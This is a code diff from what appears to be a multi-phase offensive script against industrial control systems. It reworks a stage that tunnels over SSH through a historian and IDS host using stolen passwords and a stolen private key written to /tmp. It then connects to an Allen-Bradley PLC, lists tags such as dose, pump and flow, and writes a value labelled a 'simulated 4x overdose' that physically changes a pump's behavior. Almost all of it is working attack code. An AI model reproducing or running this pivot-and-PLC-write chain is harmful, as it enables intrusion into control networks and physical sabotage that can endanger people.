@@ -1037,69 +1037,60 @@ def phase4_ssh_pivot() -> PhaseResult:
     return r
 
 
-def _start_plc_proxy(ids_transport: paramiko.Transport,
-                     plc_ip: str, plc_port: int = 44818,
-                     local_port: int = 44818) -> socket.socket:
+def _open_cip_tunnel(
+    hist_ip: str, hist_user: str, hist_pass: str,
+    ids_ip: str,  ids_user: str,  ids_pass: str,
+    ids_pkey: "paramiko.PKey | None",
+    plc_ip: str,  local_port: int = 44818,
+) -> tuple["subprocess.Popen", "str | None"]:
     """
-    Bind a local TCP socket on local_port and, for every accepted connection,
-    open a Paramiko direct-tcpip channel from IDS → PLC and proxy bytes
-    bidirectionally in daemon threads.
+    Spawn a native ssh -L tunnel:  localhost:local_port → IDS → PLC:local_port
+    Historian is the ProxyCommand jump host (sshpass for password auth).
+    IDS auth uses the stolen private key when available, else sshpass password.
 
-    Returns the listening server socket (caller must close it when done).
-    This replaces the fragile subprocess SSH tunnel — we reuse the already-
-    authenticated Paramiko transport so no sshpass/key files are needed.
+    Returns (Popen, key_file_path_or_None).
+    Caller must .terminate() the process and delete the key file when done.
     """
-    import threading
+    # Write stolen key to disk so ssh -i can use it
+    key_file: str | None = None
+    if ids_pkey:
+        key_file = "/tmp/ids_rsa"
+        with open(key_file, "w") as kf:
+            ids_pkey.write_private_key(kf)
+        os.chmod(key_file, 0o600)
 
-    # Free the port if a previous run left it bound
+    # Kill any stale listener from a previous run
     run_cmd(f"fuser -k {local_port}/tcp 2>/dev/null || true", capture=False)
-    time.sleep(0.3)
+    time.sleep(0.5)
 
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    if hasattr(socket, "SO_REUSEPORT"):
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-    srv.bind(("127.0.0.1", local_port))
-    srv.listen(5)
-    srv.settimeout(60)
+    # Historian hop via ProxyCommand — always password-authed
+    ssh_opts   = "-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=no"
+    proxy_cmd  = (
+        f"sshpass -p '{hist_pass}' ssh -W %h:%p "
+        f"{ssh_opts} {hist_user}@{hist_ip}"
+    )
+    fwd        = f"-N -L {local_port}:{plc_ip}:{local_port}"
+    proxy_opt  = f'-o "ProxyCommand={proxy_cmd}"'
 
-    def _proxy(client_sock: socket.socket):
-        try:
-            chan = ids_transport.open_channel(
-                "direct-tcpip", (plc_ip, plc_port), ("127.0.0.1", local_port)
-            )
-        except Exception as e:
-            client_sock.close()
-            return
+    if key_file:
+        # Key auth to IDS — no outer sshpass needed
+        cmd = (
+            f"ssh {fwd} {ssh_opts} {proxy_opt} "
+            f"-i {key_file} {ids_user}@{ids_ip}"
+        )
+    else:
+        # Password auth to IDS
+        cmd = (
+            f"sshpass -p '{ids_pass}' ssh {fwd} {ssh_opts} {proxy_opt} "
+            f"{ids_user}@{ids_ip}"
+        )
 
-        def _pipe(src, dst):
-            try:
-                while True:
-                    data = src.recv(4096)
-                    if not data:
-                        break
-                    dst.sendall(data)
-            except Exception:
-                pass
-            finally:
-                try: src.close()
-                except Exception: pass
-                try: dst.close()
-                except Exception: pass
-
-        threading.Thread(target=_pipe, args=(client_sock, chan), daemon=True).start()
-        threading.Thread(target=_pipe, args=(chan, client_sock), daemon=True).start()
-
-    def _accept_loop():
-        while True:
-            try:
-                client, _ = srv.accept()
-                threading.Thread(target=_proxy, args=(client,), daemon=True).start()
-            except Exception:
-                break
-
-    threading.Thread(target=_accept_loop, daemon=True).start()
-    return srv
+    proc = subprocess.Popen(
+        cmd, shell=True,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.PIPE,   # captured so we can report why it died
+    )
+    return proc, key_file
 
 
 def phase5_plc_attack() -> PhaseResult:
@@ -1120,12 +1111,16 @@ def phase5_plc_attack() -> PhaseResult:
     ids_port = CFG["ids"]["port"]
     ids_user = CFG["ids"]["username"]
     ids_pass = CFG["ids"]["password"]
-    ids_pkey: paramiko.PKey | None = CFG["ids"].get("private_key")
+    ids_pkey: "paramiko.PKey | None" = CFG["ids"].get("private_key")
 
-    LOCAL_PORT = 44818
+    LOCAL_PORT  = 44818
+    INTERESTING = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz"}
+    NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
+    # Allen-Bradley ControlLogix CPUs can live in different backplane slots
+    CIP_SLOTS = ["", "/0", "/1", "/2", "/3"]
 
     warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
-    warn(f"Strategy: Paramiko proxy  127.0.0.1:{LOCAL_PORT} → IDS ({ids_ip}) → PLC:{LOCAL_PORT}")
+    warn(f"Strategy: native ssh -L  127.0.0.1:{LOCAL_PORT} → IDS ({ids_ip}) → PLC:{LOCAL_PORT}")
     warn("MasterFlex pump will physically change behavior.")
 
     console.print()
@@ -1134,41 +1129,53 @@ def phase5_plc_attack() -> PhaseResult:
         r.finding = "Skipped by operator"
         return r
 
-    hist_client: paramiko.SSHClient | None = None
-    ids_client:  paramiko.SSHClient | None = None
-    proxy_srv:   socket.socket | None      = None
+    tunnel_proc: "subprocess.Popen | None" = None
+    key_file:    "str | None"              = None
 
     try:
-        # ── Re-establish Paramiko chain: Kali → Historian → IDS ──────────────
-        info(f"Connecting Kali → Historian ({hist_ip})...")
-        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
-                                  password=hist_pass, port=hist_port)
-
-        info(f"Hopping Historian → IDS ({ids_ip})...")
-        ids_client = ssh_hop(
-            hist_client, ids_ip, ids_port, ids_user,
-            target_pass=None if ids_pkey else ids_pass,
-            pkey=ids_pkey,
+        # ── Spawn the real ssh -L tunnel ──────────────────────────────────────
+        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
+        tunnel_proc, key_file = _open_cip_tunnel(
+            hist_ip, hist_user, hist_pass,
+            ids_ip,  ids_user,  ids_pass, ids_pkey,
+            plc_ip,  LOCAL_PORT,
         )
 
-        # ── Open pure-Python proxy: 127.0.0.1:44818 → IDS transport → PLC ───
-        # Reuses the authenticated Paramiko transport — no sshpass, no key files,
-        # no subprocess timing. The PLC sees traffic sourced from IDS (10.20.20.x).
-        ids_transport = ids_client.get_transport()
-        info(f"Starting Paramiko proxy  127.0.0.1:{LOCAL_PORT} → {plc_ip}:{LOCAL_PORT}")
-        proxy_srv = _start_plc_proxy(ids_transport, plc_ip, LOCAL_PORT, LOCAL_PORT)
-        ok(f"Proxy listening on 127.0.0.1:{LOCAL_PORT}")
+        info("Waiting 4 s for tunnel to establish...")
+        time.sleep(4)
 
-        # ── Fire CIP Write locally through the tunnel ────────────────────────
+        if tunnel_proc.poll() is not None:
+            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
+            raise RuntimeError(
+                f"ssh tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
+            )
+        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")
+
+        # ── Slot hunt: try CIP paths until one opens ──────────────────────────
         from pycomm3 import LogixDriver
-        info(f"Connecting pycomm3 → 127.0.0.1:{LOCAL_PORT}  (tunnelled to {plc_ip})")
 
-        INTERESTING = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz"}
-        NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
+        plc_conn    = None
+        working_path = None
+        for slot in CIP_SLOTS:
+            path = f"127.0.0.1{slot}"
+            info(f"Trying CIP path: {path!r}")
+            drv = LogixDriver(path)
+            try:
+                drv.open()
+                plc_conn     = drv
+                working_path = path
+                ok(f"PLC connected at {path!r}")
+                break
+            except Exception as slot_err:
+                warn(f"  {path!r} → {slot_err}")
+                try: drv.close()
+                except Exception: pass
 
-        plc_conn = LogixDriver("127.0.0.1")
-        plc_conn.open()
-        ok(f"Connected to PLC via tunnel  127.0.0.1 → {plc_ip}")
+        if plc_conn is None:
+            raise RuntimeError(
+                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel.\n"
+                "Verify the PLC is powered on and sshpass is installed on Kali."
+            )
 
         try:
             # ── Tag enumeration ───────────────────────────────────────────────
@@ -1192,9 +1199,8 @@ def phase5_plc_attack() -> PhaseResult:
             console.print(tag_table)
 
             if not filtered:
-                warn("No interesting tags matched the filter — showing all tags:")
-                all_table = Table(show_header=True, header_style="bold cyan",
-                                  border_style="dim")
+                warn("No interesting tags matched — showing first 40 raw tags:")
+                all_table = Table(show_header=True, header_style="bold cyan", border_style="dim")
                 all_table.add_column("Tag Name",  style="dim green",  width=36)
                 all_table.add_column("Data Type", style="dim yellow", width=12)
                 for t in all_tags[:40]:
@@ -1204,10 +1210,10 @@ def phase5_plc_attack() -> PhaseResult:
             # ── Validate configured tag; prompt if missing ────────────────────
             probe = plc_conn.read(tag)
             if probe is None or probe.value is None:
-                warn(f"Configured tag '{tag}' returned None — it may not exist on this PLC.")
+                warn(f"Configured tag '{tag}' returned None.")
                 console.print()
                 tag = Prompt.ask(
-                    "[yellow]Enter the correct tag name from the table above to attack[/yellow]"
+                    "[yellow]Enter the correct tag name from the table above[/yellow]"
                 )
                 CFG["plc"]["tag"] = tag
                 ok(f"Tag updated → [bold]{tag}[/bold]")
@@ -1230,7 +1236,7 @@ def phase5_plc_attack() -> PhaseResult:
             ok(r.finding)
         else:
             r.status  = "success"
-            r.finding = f"CIP Write sent — tag read back as {after.value}, verify on PLC/Grafana"
+            r.finding = f"CIP Write sent — read back {after.value}, verify on PLC/Grafana"
             warn(r.finding)
 
         r.output = f"Before: {before.value}  After: {after.value}"
@@ -1241,16 +1247,12 @@ def phase5_plc_attack() -> PhaseResult:
         err(str(e))
 
     finally:
-        if proxy_srv:
-            try: proxy_srv.close()
-            except Exception: pass
-            info("Paramiko proxy closed")
-        if ids_client:
-            try: ids_client.close()
-            except Exception: pass
-        if hist_client:
-            try: hist_client.close()
-            except Exception: pass
+        if tunnel_proc and tunnel_proc.poll() is None:
+            tunnel_proc.terminate()
+            info("SSH tunnel closed")
+        if key_file and os.path.exists(key_file):
+            os.remove(key_file)
+            info(f"Removed {key_file}")
 
     return r
 
